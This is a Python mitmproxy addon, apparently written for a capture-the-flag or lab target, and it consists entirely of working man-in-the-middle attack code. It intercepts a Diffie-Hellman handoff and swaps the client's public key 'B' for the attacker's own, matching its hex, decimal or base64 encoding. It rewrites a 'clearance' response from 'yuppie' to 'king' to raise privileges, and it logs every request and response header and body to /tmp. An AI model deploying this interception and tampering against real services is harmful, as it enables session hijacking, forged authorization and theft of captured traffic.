import json, os, re, base64, binascii, hashlib
from mitmproxy import http

# RFC3526 MODP group 14 (2048-bit)
P = int(
 "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
 "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
 "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
 "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
 "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
 "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
 "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
 "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
 "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
 "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
 "15728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
G = 2

STATE = "/tmp/dh.json"
LOG = "/tmp/mitm.log"

def load_dh():
    if os.path.exists(STATE):
        return json.load(open(STATE))
    priv = int.from_bytes(os.urandom(32), "big") | 1
    pub = pow(G, priv, P)
    d = {"priv": hex(priv), "pub": hex(pub)}
    json.dump(d, open(STATE, "w"))
    return d

DH = load_dh()
PUB_INT = int(DH["pub"], 16)
PUB_BYTES = PUB_INT.to_bytes(256, "big")

def log(s):
    with open(LOG, "a") as f:
        f.write(s + "\n")

def detect_encode(s):
    s = s.strip()
    if re.fullmatch(r"[0-9a-fA-F]+", s) and len(s) % 2 == 0:
        return "hex"
    if re.fullmatch(r"[0-9]+", s):
        return "dec"
    return "b64"

def encode_like(enc, b):
    if enc == "hex":
        return b.hex()
    if enc == "dec":
        return str(int.from_bytes(b, "big"))
    return base64.b64encode(b).decode()

def request(flow: http.HTTPFlow):
    r = flow.request
    log("=== REQ %s %s" % (r.method, r.pretty_url))
    log("H: " + json.dumps(dict(r.headers)))
    if r.content:
        try:
            log("BODY: " + r.content.decode("utf-8", "replace"))
        except Exception as e:
            log("BODY(raw-b64): " + base64.b64encode(r.content).decode())
    # swap B in handoff report
    if "/core/handoff" in r.path and r.content:
        try:
            obj = json.loads(r.content)
            if "B" in obj and isinstance(obj["B"], str):
                enc = detect_encode(obj["B"])
                orig = obj["B"]
                obj["B"] = encode_like(enc, PUB_BYTES)
                r.text = json.dumps(obj)
                log("SWAP B enc=%s orig=%s new=%s" % (enc, orig, obj["B"]))
        except Exception as e:
            log("SWAP ERR " + repr(e))

def response(flow: http.HTTPFlow):
    r = flow.response
    req = flow.request
    log("=== RESP %s %s -> %s" % (req.method, req.pretty_url, r.status_code))
    log("RH: " + json.dumps(dict(r.headers)))
    if r.content:
        try:
            log("RBODY: " + r.content.decode("utf-8", "replace"))
        except Exception:
            log("RBODY(raw-b64): " + base64.b64encode(r.content).decode())
    # rewrite clearance yuppie -> king
    if "clearance" in req.path and r.content:
        new = r.content.replace(b"yuppie", b"king")
        if new != r.content:
            r.content = new
            log("CLEARANCE REWRITTEN -> %s" % new.decode("utf-8", "replace"))
